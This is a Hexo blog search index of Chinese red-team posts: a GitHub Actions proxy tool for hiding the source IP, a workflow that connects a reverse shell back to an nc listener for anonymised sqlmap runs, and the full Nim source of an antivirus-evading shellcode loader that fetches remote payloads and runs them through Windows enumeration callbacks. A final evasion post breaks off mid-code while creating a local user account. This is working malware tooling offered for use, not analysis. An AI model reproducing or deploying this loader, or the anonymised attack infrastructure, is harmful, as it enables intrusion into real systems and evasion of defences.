<?xml version="1.0" encoding="utf-8"?>
<search>
  
  
  
  <entry>
    <title>WaterDragonv1.0:利用GithubAction实现代理功能</title>
    <link href="/2022/06/20/WaterDragon_v1.0-%E5%88%A9%E7%94%A8GithubAction%E5%AE%9E%E7%8E%B0%E4%BB%A3%E7%90%86%E5%8A%9F%E8%83%BD/"/>
    <url>/2022/06/20/WaterDragon_v1.0-%E5%88%A9%E7%94%A8GithubAction%E5%AE%9E%E7%8E%B0%E4%BB%A3%E7%90%86%E5%8A%9F%E8%83%BD/</url>
    
    <content type="html"><![CDATA[<h1 id="WaterDragon-水龙-v1-0"><a href="#WaterDragon-水龙-v1-0" class="headerlink" title="WaterDragon 水龙 v1.0"></a>WaterDragon 水龙 v1.0</h1><p>和水一样 灵活多变,</p><p>像龙一样 来去自如</p><h2 id="用Github-Action实现IP代理功能-也可翻墙"><a href="#用Github-Action实现IP代理功能-也可翻墙" class="headerlink" title="用Github Action实现IP代理功能 也可翻墙"></a>用Github Action实现IP代理功能 也可翻墙</h2><h3 id="核心"><a href="#核心" class="headerlink" title="核心"></a>核心</h3><p>这个项目的<strong>核心是NPS[<a href="https://github.com/ehang-io/nps]">https://github.com/ehang-io/nps]</a> + Github Action</strong><br>Github Action和SCF实现代理池的方式不一样：<strong>SCF可以用网关触发，但是Action不是</strong>，Action是给你提供了一台可出不可入的如同私人电脑一般的一个虚拟环境，所以我们如果要想用代理到Action然后去访问 就要我们的<strong>vps 帮忙，先做个穿透，然后转发</strong></p><h2 id="Tips-代理出去的IP是微软云的-而且IP众多-也不容易被ban"><a href="#Tips-代理出去的IP是微软云的-而且IP众多-也不容易被ban" class="headerlink" title="Tips:代理出去的IP是微软云的 而且IP众多 也不容易被ban"></a>Tips:代理出去的IP是微软云的 而且IP众多 也不容易被ban</h2><h1 id="使用方法"><a href="#使用方法" class="headerlink" title="使用方法"></a>使用方法</h1><h4 id="1-在vps上装nps并配置"><a href="#1-在vps上装nps并配置" class="headerlink" title="1.在vps上装nps并配置"></a>1.在vps上装nps并配置</h4><p>下载地址 <a href="https://github.com/ehang-io/nps/releases/tag/v0.26.10">https://github.com/ehang-io/nps/releases/tag/v0.26.10</a><br>下载合适的版本 这里下载的是linux_amd64_server.tar.gz<br>执行<code>tar -axvf linux_amd64_server.tar.gz</code>进行解压<br><img src="/images/WaterDragonv1.0-%E5%88%A9%E7%94%A8GithubAction%E5%AE%9E%E7%8E%B0%E4%BB%A3%E7%90%86%E5%8A%9F%E8%83%BD/222.png"></p><h4 id="2-然后去修改配置"><a href="#2-然后去修改配置" class="headerlink" title="2.然后去修改配置"></a>2.然后去修改配置</h4><p><code>cd conf</code><br><code>vim nps.conf</code><br>我们修改一共2个东西</p><h6 id="①-首先是-web-password"><a href="#①-首先是-web-password" class="headerlink" title="①.首先是 web_password"></a>①.首先是 web_password</h6><p><strong>这个改的越复杂越好</strong> 是nps的管理面板 不过这里不用gui的 用的是webapi，用不到gui的密码，如果是默认的123，会被有心人搞破坏</p><h6 id="②-然后是这里"><a href="#②-然后是这里" class="headerlink" title="②.然后是这里"></a>②.然后是这里</h6><p><img src="/images/WaterDragonv1.0-%E5%88%A9%E7%94%A8GithubAction%E5%AE%9E%E7%8E%B0%E4%BB%A3%E7%90%86%E5%8A%9F%E8%83%BD/333.png"><br>把<code>auth_key</code>前面的注释去掉，然后修改auth_key的值<br>然后把<code>auth_crypt_key</code>修改为别的16位长度的一个字符串 （默认也可以<br><strong>然后把auth_key 记住备用</strong></p><h5 id="③-http-proxy-port"><a href="#③-http-proxy-port" class="headerlink" title="③.http_proxy_port"></a>③.http_proxy_port</h5><p>可改可不改 <strong>改了是防止http监听端口与apache，nginx这些服务冲突</strong></p><h5 id="④-web-port"><a href="#④-web-port" class="headerlink" title="④.web_port"></a>④.web_port</h5><p><strong>api的地址</strong>，监听的是8080端口 如果8080与本地软件有冲突则更改（按需更改）,如果改过就是    vps的ip:web_port<br>然后回到上级目录<code>cd .. </code><br>随后让nps运行<code> ./nps</code><br>如果正常未出现问题 就可以把nps挂后台然后进行 下一步了<br><code>nohup ./nps &amp;</code></p><h4 id="3-获取github-token"><a href="#3-获取github-token" class="headerlink" title="3.获取github_token"></a>3.获取github_token</h4><h5 id="前往https-github-com-settings-tokens"><a href="#前往https-github-com-settings-tokens" class="headerlink" title="前往https://github.com/settings/tokens"></a>前往<a href="https://github.com/settings/tokens">https://github.com/settings/tokens</a></h5><p><img src="/images/WaterDragonv1.0-%E5%88%A9%E7%94%A8GithubAction%E5%AE%9E%E7%8E%B0%E4%BB%A3%E7%90%86%E5%8A%9F%E8%83%BD/444.png"></p><p><img src="/images/WaterDragonv1.0-%E5%88%A9%E7%94%A8GithubAction%E5%AE%9E%E7%8E%B0%E4%BB%A3%E7%90%86%E5%8A%9F%E8%83%BD/666.png"><br><strong>记住备用</strong></p><h4 id="配置脚本"><a href="#配置脚本" class="headerlink" title="配置脚本"></a>配置脚本</h4><p>首先下载脚本<br><code>git clone https://github.com/sh3d0ww01f/WaterDragon.git</code><br>然后修改<code>main.py</code>文件<br><img src="/images/WaterDragonv1.0-%E5%88%A9%E7%94%A8GithubAction%E5%AE%9E%E7%8E%B0%E4%BB%A3%E7%90%86%E5%8A%9F%E8%83%BD/777.png"><br>   ①<strong>api的位置填上自己的api地址(<a href="http://vps_ip:web_port，如果没改过前面的web_port">http://vps_ip:web_port，如果没改过前面的web_port</a> 则就是<a href="http://vps_ip:8080/">http://vps_ip:8080</a>)</strong><br> ②<strong>auth_key 写上更改过的auth_key</strong><br> ③<strong>token写github获取的token</strong></p><h1 id="运行脚本"><a href="#运行脚本" class="headerlink" title="运行脚本"></a>运行脚本</h1><p><code>python3 main.py</code><br><img src="/images/WaterDragonv1.0-%E5%88%A9%E7%94%A8GithubAction%E5%AE%9E%E7%8E%B0%E4%BB%A3%E7%90%86%E5%8A%9F%E8%83%BD/888.png"><br><strong>①.输入socks5 进入隧道管理 我们需要先加一个</strong><br><img src="/images/WaterDragonv1.0-%E5%88%A9%E7%94%A8GithubAction%E5%AE%9E%E7%8E%B0%E4%BB%A3%E7%90%86%E5%8A%9F%E8%83%BD/999.png"><br>出现成功连接WebApi则说明api配置正确<br><strong>②.输入add 增加socks5隧道</strong><br><img src="/images/WaterDragonv1.0-%E5%88%A9%E7%94%A8GithubAction%E5%AE%9E%E7%8E%B0%E4%BB%A3%E7%90%86%E5%8A%9F%E8%83%BD/1111.png"><br><strong>密钥随意写，端口只要外网能通就可以，加密的话1代表要加密，0代表不加密</strong><br><strong>③.配置好了新隧道，我们回到菜单使用</strong><br>输入<code>back</code> 回到菜单,然后<strong>键入<code>manager</code>进入Github Action管理</strong><br><img src="/images/WaterDragonv1.0-%E5%88%A9%E7%94%A8GithubAction%E5%AE%9E%E7%8E%B0%E4%BB%A3%E7%90%86%E5%8A%9F%E8%83%BD/2222.png"><br>输入<code>select</code>选择要连接的socks5隧道<br>这里选择新增的 客户端ID为21的<br><img src="/images/WaterDragonv1.0-%E5%88%A9%E7%94%A8GithubAction%E5%AE%9E%E7%8E%B0%E4%BB%A3%E7%90%86%E5%8A%9F%E8%83%BD/3333.png"></p><p>出现<code>start success</code>即为启动成功</p><p><img src="/images/WaterDragonv1.0-%E5%88%A9%E7%94%A8GithubAction%E5%AE%9E%E7%8E%B0%E4%BB%A3%E7%90%86%E5%8A%9F%E8%83%BD/4444.png"><br>配置一下 配置好 就可以用这个代理了</p><h1 id="效果"><a href="#效果" class="headerlink" title="效果"></a>效果</h1><p><img src="/images/WaterDragonv1.0-%E5%88%A9%E7%94%A8GithubAction%E5%AE%9E%E7%8E%B0%E4%BB%A3%E7%90%86%E5%8A%9F%E8%83%BD/2.png"><br><img src="/images/WaterDragonv1.0-%E5%88%A9%E7%94%A8GithubAction%E5%AE%9E%E7%8E%B0%E4%BB%A3%E7%90%86%E5%8A%9F%E8%83%BD/3.png"><br><img src="/images/WaterDragonv1.0-%E5%88%A9%E7%94%A8GithubAction%E5%AE%9E%E7%8E%B0%E4%BB%A3%E7%90%86%E5%8A%9F%E8%83%BD/4.png"><br><img src="/images/WaterDragonv1.0-%E5%88%A9%E7%94%A8GithubAction%E5%AE%9E%E7%8E%B0%E4%BB%A3%E7%90%86%E5%8A%9F%E8%83%BD/5.png"></p><h1 id="停止Action"><a href="#停止Action" class="headerlink" title="停止Action"></a>停止Action</h1><p><img src="/images/WaterDragonv1.0-%E5%88%A9%E7%94%A8GithubAction%E5%AE%9E%E7%8E%B0%E4%BB%A3%E7%90%86%E5%8A%9F%E8%83%BD/5555.png"><br>然后键入0 即可暂停现在运行中的GithubAction机子<br>出现“取消运行成功” 则代表成功暂停运行</p><h1 id="后序"><a href="#后序" class="headerlink" title="后序"></a>后序</h1><p>Action和SCF不一样 没有多出口 但是可以多开Action，然后实现多ip访问的目的</p>]]></content>
    
    
    <categories>
      
      <category>工具开发</category>
      
    </categories>
    
    
    <tags>
      
      <tag>工具开发</tag>
      
      <tag>隐匿</tag>
      
      <tag>代理功能</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>如何使用Github的workflow功能创建一台临时的vps!</title>
    <link href="/2022/01/09/%5B%E9%9A%90%E5%8C%BF%5D%E5%A6%82%E4%BD%95%E4%BD%BF%E7%94%A8github%E7%9A%84workflow%E5%8A%9F%E8%83%BD%20%E5%88%9B%E5%BB%BA%E4%B8%80%E5%8F%B0%E4%B8%B4%E6%97%B6%E7%9A%84vps%EF%BC%81/"/>
    <url>/2022/01/09/%5B%E9%9A%90%E5%8C%BF%5D%E5%A6%82%E4%BD%95%E4%BD%BF%E7%94%A8github%E7%9A%84workflow%E5%8A%9F%E8%83%BD%20%E5%88%9B%E5%BB%BA%E4%B8%80%E5%8F%B0%E4%B8%B4%E6%97%B6%E7%9A%84vps%EF%BC%81/</url>
    
    <content type="html"><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>有时候 想跑一点脚本 但是本地没有环境怎么办呢 workflow又不会配置的 只会命令行配置这样子 怎么办呢 （要是有交互shell就好了 那么，交互shell今天他来了！ 除了可以熟悉的命令配置环境外 还可以有一些意想不到的功能等着你去发现！ 比如做个流量池什么的 因为action断开后 再连上 会刷新机子 nc上来的就是一台新的机子 (跑sqlmap的时候就可以达到隐匿效果 ！！！！！需要github的api token 详情见下文</p><h2 id="STEP-1-打开https-github-com-settings-tokens"><a href="#STEP-1-打开https-github-com-settings-tokens" class="headerlink" title="STEP 1 打开https://github.com/settings/tokens"></a>STEP 1 打开<a href="https://github.com/settings/tokens">https://github.com/settings/tokens</a></h2><p><img src="https://img-blog.csdnimg.cn/83b49854c2474abd88f332f0c8acb868.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAc2hhZG93ICB3b2xm,size_20,color_FFFFFF,t_70,g_se,x_16#pic_center"></p><p>点击箭头所指按钮生成token</p><p>全部勾上<br><img src="https://img-blog.csdnimg.cn/0260d5f0051341f1bfc511d4e713dd9c.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAc2hhZG93ICB3b2xm,size_20,color_FFFFFF,t_70,g_se,x_16#pic_center"></p><p>最后再点generate token按钮</p><p><img src="https://img-blog.csdnimg.cn/2f04d6f156b9457c8507dc570766a3dd.png#pic_center"></p><p>然后就会返回一串字符串 这就是access_token了<br><img src="https://img-blog.csdnimg.cn/160ed29624164a00bd396303807a2937.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAc2hhZG93ICB3b2xm,size_20,color_FFFFFF,t_70,g_se,x_16#pic_center"></p><h2 id="STEP-2-配置config"><a href="#STEP-2-配置config" class="headerlink" title="STEP 2 配置config"></a>STEP 2 配置config</h2><p><img src="https://img-blog.csdnimg.cn/cb67d29db9144132ac03865393b8615b.png#pic_center"></p><p>右键编辑</p><p><img src="https://img-blog.csdnimg.cn/9714d493f9fe42aeadd0bbec40913006.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAc2hhZG93ICB3b2xm,size_20,color_FFFFFF,t_70,g_se,x_16#pic_center"></p><p>host和port是要弹到的服务器的ip和端口 token就是第一步获取到的token</p><p>比如我在我服务器上(假设其 是外网ip为1.2.3.4的vps) 执行:nc -lvp 6666 那我在config里面就写 host&#x3D;1.2.3.4 port&#x3D;6666</p><p>结果<br><img src="https://img-blog.csdnimg.cn/f0dcfeb5d70149dcb206fab533500bbc.png#pic_center"><br><img src="https://img-blog.csdnimg.cn/55776e165b7549e2b904948f6ad3224c.png#pic_center"><br><img src="https://img-blog.csdnimg.cn/91190c7bf25e40dca76355c7652964db.png#pic_center"></p><p>可以拿来跑一些脚本 git一些工具 使用 比如sqlmap之类的 建议用小号 防止被封…</p><p>*注意:<br>这个只有6h的使用时间 超时就创建不起来了 详情请看 github的action、workflow之类的应用</p><p>下载地址 <a href="https://gitee.com/oagi/shell-on-cloud/blob/master/SOTGC.zip">https://gitee.com/oagi/shell-on-cloud/blob/master/SOTGC.zip</a></p>]]></content>
    
    
    <categories>
      
      <category>渗透学习</category>
      
    </categories>
    
    
    <tags>
      
      <tag>shellcode</tag>
      
      <tag>隐匿</tag>
      
      <tag>红队工具</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>nim-shellcode-loader[vt查杀3/67][微步云沙箱1/24]</title>
    <link href="/2021/11/13/%5Bnim%5Dshellcode-loader%5Bvt%E6%9F%A5%E6%9D%803%5D%5B%E5%BE%AE%E6%AD%A5%E4%BA%91%E6%B2%99%E7%AE%B1%E6%9F%A5%E6%9D%801%5D/"/>
    <url>/2021/11/13/%5Bnim%5Dshellcode-loader%5Bvt%E6%9F%A5%E6%9D%803%5D%5B%E5%BE%AE%E6%AD%A5%E4%BA%91%E6%B2%99%E7%AE%B1%E6%9F%A5%E6%9D%801%5D/</url>
    
    <content type="html"><![CDATA[<h1 id="使用方法"><a href="#使用方法" class="headerlink" title="使用方法"></a>使用方法</h1><h2 id="①可payload直接键入上线"><a href="#①可payload直接键入上线" class="headerlink" title="①可payload直接键入上线"></a>①可payload直接键入上线</h2><p><strong>注意:除了加载bin文件是不用额外操作之外 其他的加载方式都需要把payload中的\x删去</strong></p><p><img src="https://www.t00ls.cc/attachments/month_2111/211112124011bc1a6f44ce2f26.gif"></p><h2 id="②可加载bin文件上线"><a href="#②可加载bin文件上线" class="headerlink" title="②可加载bin文件上线"></a>②可加载bin文件上线</h2><p><strong>即cs里面生成的raw</strong></p><p><img src="https://www.t00ls.cc/attachments/month_2111/211112124011bc1a6f44ce2f26.gif"></p><h2 id="③可请求远程服务器获取payload"><a href="#③可请求远程服务器获取payload" class="headerlink" title="③可请求远程服务器获取payload"></a>③可请求远程服务器获取payload</h2><p><img src="https://www.t00ls.cc/attachments/month_2111/2111121257abd557941e5bd326.gif"></p><h3 id="也可以请求github-x2F-gitee获取payload"><a href="#也可以请求github-x2F-gitee获取payload" class="headerlink" title="也可以请求github&#x2F;gitee获取payload"></a>也可以请求github&#x2F;gitee获取payload</h3><p><img src="https://www.t00ls.cc/attachments/month_2111/2111121233513349ef9f5613f7.png"></p><p>注意:<strong>放在远程服务器上的必须是去掉\x的</strong><br>如图所示:</p><p><img src="https://www.t00ls.cc/attachments/month_2111/211112124677f544d3ecf8360b.png"></p><h1 id="查杀情况"><a href="#查杀情况" class="headerlink" title="查杀情况"></a>查杀情况</h1><p><img src="https://www.t00ls.cc/attachments/month_2111/21111212488ac4cec53c1e1e5b.png"></p><figure class="highlight nim"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br></pre></td><td class="code"><pre><code class="hljs nim"><span class="hljs-keyword">import</span> httpclient<br><span class="hljs-keyword">import</span> streams<br><span class="hljs-keyword">import</span> <span class="hljs-type">OpenSSL</span><br><span class="hljs-keyword">import</span> os<br><span class="hljs-keyword">import</span> strutils<br><span class="hljs-keyword">import</span> winim/lean<br><span class="hljs-keyword">import</span> osproc<br><span class="hljs-keyword">import</span> stew/byteutils<br><span class="hljs-keyword">import</span> net<br><span class="hljs-keyword">proc</span> shellcodeCallback(shellcode: <span class="hljs-type">openarray</span>[byte]): <span class="hljs-type">void</span> =<br>    echo <span class="hljs-string">&quot;[*] T00ls.cc Nim-shellcode-loader shadowwolf&quot;</span><br>    <span class="hljs-keyword">let</span> <span class="hljs-type">CurrentProcess</span> = <span class="hljs-type">GetCurrentProcessId</span>()<br>    echo <span class="hljs-string">&quot;[*] Target Process: &quot;</span>, <span class="hljs-type">CurrentProcess</span><br>    echo <span class="hljs-string">&quot;[*] Length Of Shellcode: &quot;</span>, len(shellcode)<br>    echo <span class="hljs-string">&quot;[+] Injecting!&quot;</span><br>    <span class="hljs-keyword">discard</span> <span class="hljs-string">&quot;&quot;&quot;</span><br><span class="hljs-string">    T00ls.cc 14454-shadowwolf</span><br><span class="hljs-string">    &quot;&quot;&quot;</span><br>    <span class="hljs-comment"># Application for memory</span><br>    <span class="hljs-keyword">let</span> rPtr = <span class="hljs-type">VirtualAlloc</span>(<br>        <span class="hljs-keyword">nil</span>,<br>        <span class="hljs-keyword">cast</span>[<span class="hljs-type">SIZE_T</span>](shellcode.len),<br>        <span class="hljs-type">MEM_COMMIT</span>,<br>        <span class="hljs-type">PAGE_EXECUTE_READ_WRITE</span><br>    )<br><br>    <span class="hljs-comment"># Copy Shellcode to the allocated memory section</span><br>    copyMem(rPtr,unsafeAddr shellcode,<span class="hljs-keyword">cast</span>[<span class="hljs-type">SIZE_T</span>](shellcode.len))<br><br>    <span class="hljs-comment"># Callback execution</span><br>    <span class="hljs-type">EnumSystemGeoID</span>(<br>        <span class="hljs-number">16</span>,<br>        <span class="hljs-number">0</span>,<br>        <span class="hljs-keyword">cast</span>[<span class="hljs-type">GEO_ENUMPROC</span>](rPtr)<br>    ) <br><span class="hljs-keyword">proc</span> <span class="hljs-type">RequestGet</span>(url:<span class="hljs-type">string</span>,header=&#123;<span class="hljs-string">&quot;user-agent&quot;</span>: <span class="hljs-string">&quot;Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.69 Safari/537.36&quot;</span>&#125;):<span class="hljs-type">string</span>=<br>     <span class="hljs-keyword">type</span><br>        sslContext=<span class="hljs-keyword">ref</span> <span class="hljs-keyword">object</span><br>     <span class="hljs-keyword">var</span> <br>        client = newHttpClient(sslContext=newContext(verifyMode=<span class="hljs-type">CVerifyNone</span>))<br>        <span class="hljs-type">RequestHeaders</span>=newHttpHeaders(header)<br>        resp=client.request(url,headers=<span class="hljs-type">RequestHeaders</span>)<br>     <span class="hljs-keyword">return</span> resp.bodyStream.readAll().replace(<span class="hljs-string">&quot;\\x&quot;</span>,<span class="hljs-string">&quot; &quot;</span>).replace(<span class="hljs-string">&quot;,&quot;</span>,<span class="hljs-string">&quot;&quot;</span>).replace(<span class="hljs-string">&quot; &quot;</span>,<span class="hljs-string">&quot;&quot;</span>)<br><span class="hljs-comment">#To get the shellcode on the website you put on</span><br><span class="hljs-keyword">proc</span> <span class="hljs-type">GetShellcodeAndRun</span>(para:<span class="hljs-type">string</span>):<span class="hljs-type">void</span>=<br>    <span class="hljs-keyword">if</span>(<span class="hljs-string">&quot;http&quot;</span> <span class="hljs-keyword">in</span> para):<br>       echo <span class="hljs-string">&quot;[*] Get the shellcode on the website:&quot;</span>&amp;para<br>       <span class="hljs-keyword">let</span> resp=<span class="hljs-type">RequestGet</span>(para)<span class="hljs-comment">#Get the shellcode on your website</span><br>       <span class="hljs-keyword">var</span> shellcode = newSeq[byte](len(resp) <span class="hljs-keyword">div</span> <span class="hljs-number">2</span>)<span class="hljs-comment">#calc the length</span><br>       hexToByteArray(resp, shellcode)<span class="hljs-comment">#convert hex string into array</span><br>       shellcodeCallback(shellcode)<span class="hljs-comment">#execute</span><br>    <span class="hljs-keyword">elif</span> fileExists(para):<br>        echo <span class="hljs-string">&quot;[*] Get the file:&quot;</span>&amp;para<br>        <span class="hljs-keyword">var</span> <br>            filename = para<br>            file: <span class="hljs-type">File</span><br>        file = open(filename, fmRead)<br>        <span class="hljs-keyword">var</span> fileSize = file.getFileSize() <br>        <span class="hljs-keyword">var</span> shellcode = newSeq[byte](fileSize)<br>        <span class="hljs-keyword">discard</span> file.readBytes(shellcode, <span class="hljs-number">0</span>, fileSize)<br>        file.close()<br>        shellcodeCallback(shellcode)<br>    <span class="hljs-keyword">else</span>:<br>        echo <span class="hljs-string">&quot;[*] Get the string:&quot;</span>&amp;para<br>        <span class="hljs-keyword">var</span> hexstr: <span class="hljs-type">string</span> = para<br>        <span class="hljs-keyword">var</span> shellcode = newSeq[byte](len(hexstr) <span class="hljs-keyword">div</span> <span class="hljs-number">2</span>)<br>        hexToByteArray(hexstr, shellcode)<br>        shellcodeCallback(shellcode)<br><span class="hljs-keyword">if</span> paramCount()&gt;=<span class="hljs-number">1</span>:<br>   <span class="hljs-keyword">var</span> para:<span class="hljs-type">string</span>=paramStr(<span class="hljs-number">1</span>)<br>   <span class="hljs-type">GetShellcodeAndRun</span>(para)<br></code></pre></td></tr></table></figure><h3 id="过火绒，360全家桶-要试的哥哥不要开上传样本-谢谢啦"><a href="#过火绒，360全家桶-要试的哥哥不要开上传样本-谢谢啦" class="headerlink" title="过火绒，360全家桶 要试的哥哥不要开上传样本 谢谢啦"></a>过火绒，360全家桶 要试的哥哥不要开上传样本 谢谢啦</h3><h3 id="编译生成exe-nim-c-–cpu-i386-d-mingw-d-ssl-–opt-size-shellcode-loader-nim"><a href="#编译生成exe-nim-c-–cpu-i386-d-mingw-d-ssl-–opt-size-shellcode-loader-nim" class="headerlink" title="编译生成exe:   nim  c –cpu:i386 -d:mingw -d:ssl –opt:size shellcode_loader.nim"></a>编译生成exe:   nim  c –cpu:i386 -d:mingw -d:ssl –opt:size shellcode_loader.nim</h3><h3 id="gitee-https-gitee-com-oagi-nim-shellloader"><a href="#gitee-https-gitee-com-oagi-nim-shellloader" class="headerlink" title="gitee:https://gitee.com/oagi/nim_shellloader"></a>gitee:<a href="https://gitee.com/oagi/nim_shellloader">https://gitee.com/oagi/nim_shellloader</a></h3><h3 id="源码中的EnumSystemGeoID回调函数可以换成以下函数-等价"><a href="#源码中的EnumSystemGeoID回调函数可以换成以下函数-等价" class="headerlink" title="源码中的EnumSystemGeoID回调函数可以换成以下函数 等价"></a>源码中的EnumSystemGeoID回调函数可以换成以下函数 等价</h3><figure class="highlight nim"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs nim"><span class="hljs-comment"># Callback execution</span><br>    <span class="hljs-type">EnumSystemGeoID</span>(<span class="hljs-type">GEOCLASS_NATION</span>,<span class="hljs-number">0</span>,<span class="hljs-keyword">cast</span>[<span class="hljs-type">GEO_ENUMPROC</span>](rPtr)) <span class="hljs-comment">#①</span><br>    <span class="hljs-type">EnumChildWindows</span>(<span class="hljs-keyword">cast</span>[<span class="hljs-type">HWND</span>](<span class="hljs-keyword">nil</span>),<span class="hljs-keyword">cast</span>[<span class="hljs-type">WNDENUMPROC</span>](rPtr),<span class="hljs-keyword">cast</span>[<span class="hljs-type">LPARAM</span>](<span class="hljs-keyword">nil</span>))<span class="hljs-comment">#②</span><br>    <span class="hljs-type">EnumDateFormatsA</span>(<span class="hljs-keyword">cast</span>[<span class="hljs-type">DATEFMT_ENUMPROCA</span>](rPtr) , <span class="hljs-type">LOCALE_SYSTEM_DEFAULT</span>, <span class="hljs-keyword">cast</span>[<span class="hljs-type">DWORD</span>](<span class="hljs-number">0</span>))<span class="hljs-comment">#③</span><br>    <span class="hljs-type">EnumDesktopsW</span>(<span class="hljs-type">GetProcessWindowStation</span>(),<span class="hljs-keyword">cast</span>[<span class="hljs-type">DESKTOPENUMPROCW</span>](rPtr), <span class="hljs-keyword">cast</span>[<span class="hljs-type">LPARAM</span>](<span class="hljs-keyword">nil</span>))<span class="hljs-comment">#④</span><br>    <span class="hljs-type">EnumDesktopWindows</span>(<span class="hljs-type">GetThreadDesktop</span>(<span class="hljs-type">GetCurrentThreadId</span>()),<span class="hljs-keyword">cast</span>[<span class="hljs-type">WNDENUMPROC</span>](rPtr), <span class="hljs-keyword">cast</span>[<span class="hljs-type">LPARAM</span>](<span class="hljs-keyword">nil</span>))<span class="hljs-comment">#⑤</span><br>    <span class="hljs-type">EnumSystemCodePagesA</span>(<span class="hljs-keyword">cast</span>[<span class="hljs-type">CODEPAGE_ENUMPROCA</span>](rPtr) ,<span class="hljs-number">0</span>)<span class="hljs-comment">#⑥</span><br>    <span class="hljs-type">EnumSystemCodePagesW</span>(<span class="hljs-keyword">cast</span>[<span class="hljs-type">CODEPAGE_ENUMPROCW</span>](rPtr), <span class="hljs-type">CP_INSTALLED</span>)<span class="hljs-comment">#⑦</span><br>    <span class="hljs-type">EnumSystemLanguageGroupsA</span>(<span class="hljs-keyword">cast</span>[<span class="hljs-type">LANGUAGEGROUP_ENUMPROCA</span>](rPtr),<span class="hljs-type">LGRPID_SUPPORTED</span>,<span class="hljs-number">0</span>)<span class="hljs-comment">#⑧</span><br>    <span class="hljs-type">EnumSystemLocalesA</span>(<span class="hljs-keyword">cast</span>[<span class="hljs-type">LOCALE_ENUMPROCA</span>](rPtr) ,<span class="hljs-keyword">nil</span>)<span class="hljs-comment">#⑨</span><br>    <span class="hljs-type">EnumThreadWindows</span>(<span class="hljs-number">0</span>,csat[<span class="hljs-type">WNDENUMPROC</span>](rPtr),<span class="hljs-number">0</span>) <span class="hljs-comment">#⑩</span><br>    <span class="hljs-type">EnumUILanguagesA</span>(<span class="hljs-keyword">cast</span>[<span class="hljs-type">UILANGUAGE_ENUMPROCA</span>](rPtr), <span class="hljs-type">MUI_LANGUAGE_ID</span>, <span class="hljs-number">0</span>)<span class="hljs-comment">#11</span><br>    <span class="hljs-type">EnumWindows</span>(<span class="hljs-keyword">cast</span>[<span class="hljs-type">WNDENUMPROC</span>](rPtr), <span class="hljs-keyword">nil</span>)<span class="hljs-comment">#12</span><br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>渗透学习</category>
      
    </categories>
    
    
    <tags>
      
      <tag>shellcode</tag>
      
      <tag>免杀</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>免杀-nim篇</title>
    <link href="/2021/10/01/%E5%85%8D%E6%9D%80-nim%E7%AF%87/"/>
    <url>/2021/10/01/%E5%85%8D%E6%9D%80-nim%E7%AF%87/</url>
    
    <content type="html"><![CDATA[<h1 id="正文"><a href="#正文" class="headerlink" title="正文"></a>正文</h1><p>小众语言过杀软总是这么容易…<br>轻松bypass 某数字杀软(安全大脑开启ing)<br><strong>代码有参考</strong><a href="https://github.com/lengjibo/NetUser/blob/master/NetUser.nim">冷毅的github</a><br>我写的没有他好hhhh<br>先来看效果:</p><p><img src="/images/%E5%85%8D%E6%9D%80-nim%E7%AF%87/kh6sy-78xoy.gif"></p><p><img src="/images/%E5%85%8D%E6%9D%80-nim%E7%AF%87/7.png"></p><p><img src="/images/%E5%85%8D%E6%9D%80-nim%E7%AF%87/8.png"></p><p>最后贴上代码</p><figure class="highlight nim"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs nim"><span class="hljs-keyword">import</span> winim/lean<br><span class="hljs-keyword">import</span> winim/inc/lm<br><span class="hljs-keyword">var</span> user_info = <span class="hljs-type">USER_INFO_1</span>(<br>    usri1_name: <span class="hljs-string">&quot;shadowwolf&quot;</span>,<br>    usri1_password: <span class="hljs-string">&quot;shadowwolf&quot;</span>,<br>    usri1_priv: <span 